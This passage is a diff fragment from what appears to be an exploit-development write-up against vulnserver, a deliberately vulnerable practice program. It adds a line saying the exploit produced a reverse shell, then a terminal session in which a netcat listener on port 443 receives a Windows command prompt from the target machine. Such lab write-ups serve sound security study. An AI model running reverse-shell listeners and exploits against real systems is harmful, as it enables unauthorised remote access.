@@ -546,7 +546,17 @@ print s.recv(1024)
 s.close()
 ```
 
+If we run this exploit code against vulnserver at this point we net a reverse shell and our payload was successfully executed!
+```terminal_session
+astrid:~/ # nc -lvp 443                                                                                                                 
+listening on [any] 443 ...
+192.168.1.201: inverse host lookup failed: Unknown host
+connect to [192.168.1.199] from (UNKNOWN) [192.168.1.201] 49224
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
+C:\Users\IEUser\Desktop>
+```
 
 
 
